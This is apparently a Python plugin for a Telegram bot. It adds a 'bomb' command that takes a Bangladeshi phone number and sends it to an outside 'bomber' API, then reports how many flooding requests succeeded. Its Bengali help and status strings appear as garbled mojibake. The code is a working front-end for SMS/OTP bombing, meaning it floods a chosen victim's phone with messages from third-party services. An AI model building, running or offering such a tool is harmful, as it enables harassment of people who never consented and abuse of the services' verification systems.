import requests
import json
from telebot.types import Message
import re

def register(bot, custom_command_handler, command_prefixes_list):

    @custom_command_handler("bmb", "bomb")
    def handle_bomb(message: Message):
        chat_id = message.chat.id
        user_id = message.from_user.id if message.from_user else 0

        if not message.text:
            return

        command_text = message.text.split(" ", 1)[0].lower()
        actual_command_len = 0
        for prefix in command_prefixes_list:
            if command_text.startswith(f"{prefix}bomb") or command_text.startswith(f"{prefix}bmb"):
                actual_command_len = len(command_text)
                break

        user_input = message.text[actual_command_len:].strip()

        # New help text reflecting the simplified command
        if not user_input:
            help_text = f"""тЭУ <b>ржмрзЛржорж╛ API ржмрзНржпржмрж╣рж╛рж░рзЗрж░ ржирж┐ржпрж╝ржо:</b>

<code>{command_prefixes_list[0]}bmb [ржлрзЛржи ржиржорзНржмрж░]</code>
<code>{command_prefixes_list[1]}bomb [ржлрзЛржи ржиржорзНржмрж░]</code>

<b>ржЙржжрж╛рж╣рж░ржг:</b>
<code>{command_prefixes_list[0]}bmb 01712345678</code>
<code>{command_prefixes_list[1]}bomb 01712345678</code>"""
            bot.reply_to(message, help_text, parse_mode="HTML")
            return

        phone_number = user_input.split()[0]
        amount = 1  # Amount is now fixed to 1

        # Validate and normalize phone number
        if not re.match(r'^(\+880|880|0)?1[3-9]\d{8}$', phone_number):
            bot.reply_to(message, "тЭМ рж╕ржарж┐ржХ ржмрж╛ржВрж▓рж╛ржжрзЗрж╢рж┐ ржлрзЛржи ржиржорзНржмрж░ ржжрж┐ржи! (ржЙржжрж╛рж╣рж░ржг: 01775179605)", parse_mode="HTML")
            return

        normalized_number = phone_number[-11:]

        # Send processing message
        processing_msg = bot.reply_to(message, f"ЁЯФД <b>{normalized_number}</b> ржиржорзНржмрж░рзЗ рж░рж┐ржХрзЛржпрж╝рзЗрж╕рзНржЯ ржкрж╛ржарж╛ржирзЛ рж╣ржЪрзНржЫрзЗ...\n\nтП│ <i>ржжржпрж╝рж╛ ржХрж░рзЗ рзи-рзй ржорж┐ржирж┐ржЯ ржЕржкрзЗржХрзНрж╖рж╛ ржХрж░рзБржи...</i>", parse_mode="HTML")

        try:
            url = "https://noob-bmbr.vercel.app/bomb"
            payload = {
                "number": normalized_number,
                "amount": amount
            }
            headers = {
                'Content-Type': 'application/json'
            }

            response = requests.post(url, json=payload, headers=headers, timeout=120)
            response.raise_for_status()

            data = response.json()

            successful_requests = data.get('successful_requests', 0)
            total_requests = data.get('total_requests_attempted', 0)

            if total_requests > 0:
                success_rate = (successful_requests / total_requests) * 100
            else:
                success_rate = 0

            details = data.get('details', [])
            success_count = sum(1 for api in details if api.get('status') == 'success')
            failed_count = sum(1 for api in details if api.get('status') == 'failed')
            error_count = sum(1 for api in details if api.get('status') == 'error')

            result_message = f"""тЬЕ <b>рж░рж┐ржХрзЛржпрж╝рзЗрж╕рзНржЯ рж╕ржорзНржкржирзНржи рж╣ржпрж╝рзЗржЫрзЗ!</b>

ЁЯУ▒ <b>ржлрзЛржи ржиржорзНржмрж░:</b> <code>{normalized_number}</code>
ЁЯОп <b>рж░рж┐ржХрзЛржпрж╝рзЗрж╕рзНржЯ ржкрж░рж┐ржорж╛ржг:</b> <code>{amount}</code>

ЁЯУК <b>ржлрж▓рж╛ржлрж▓:</b>
тФЬтФА ЁЯЯв <b>рж╕ржлрж▓:</b> <code>{success_count}</code>
тФЬтФА ЁЯФ┤ <b>ржмрзНржпрж░рзНрже:</b> <code>{failed_count}</code>
тФЬтФА тЪая╕П <b>рждрзНрж░рзБржЯрж┐:</b> <code>{error_count}</code>
тФФтФА ЁЯУИ <b>рж╕рж╛ржХрж╕рзЗрж╕ рж░рзЗржЯ:</b> <code>{success_rate:.1f}%</code>

ЁЯФв <b>ржорзЛржЯ API ржХрж▓:</b> <code>{total_requests}</code>
тЬЕ <b>рж╕ржлрж▓ API ржХрж▓:</b> <code>{successful_requests}</code>"""

            bot.edit_message_text(
                result_message, 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )

        except requests.exceptions.Timeout:
            bot.edit_message_text(
                "тП░ <b>ржЯрж╛ржЗржоржЖржЙржЯ!</b> API рж╕рж╛рж░рзНржнрж╛рж░ ржЦрзБржм ржзрзАрж░ ржмрж╛ ржЕржирзБржкрж▓ржмрзНржзред", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
        except requests.exceptions.RequestException as e:
            bot.edit_message_text(
                f"тЭМ <b>ржирзЗржЯржУржпрж╝рж╛рж░рзНржХ рждрзНрж░рзБржЯрж┐!</b>\n\n<code>{str(e)}</code>", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
        except json.JSONDecodeError:
            bot.edit_message_text(
                "тЭМ <b>API рж░рзЗрж╕ржкржирзНрж╕ ржкрж╛рж░рзНрж╕ ржХрж░рждрзЗ рж╕ржорж╕рзНржпрж╛!</b> рж╕рж╛рж░рзНржнрж╛рж░ ржерзЗржХрзЗ ржЕржмрзИржз JSON ржкрзЗржпрж╝рзЗржЫрж┐ред", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
        except KeyError as e:
            bot.edit_message_text(
                f"тЭМ <b>API рж░рзЗрж╕ржкржирзНрж╕ ржлрж░ржорзНржпрж╛ржЯ рж╕ржорж╕рзНржпрж╛!</b>\n\nржЕржирзБржкрж╕рзНржерж┐ржд ржлрж┐рж▓рзНржб: <code>{str(e)}</code>", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
        except Exception as e:
            bot.edit_message_text(
                f"тЭМ <b>ржЕржкрзНрж░рждрзНржпрж╛рж╢рж┐ржд рждрзНрж░рзБржЯрж┐!</b>\n\n<code>{str(e)}</code>", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
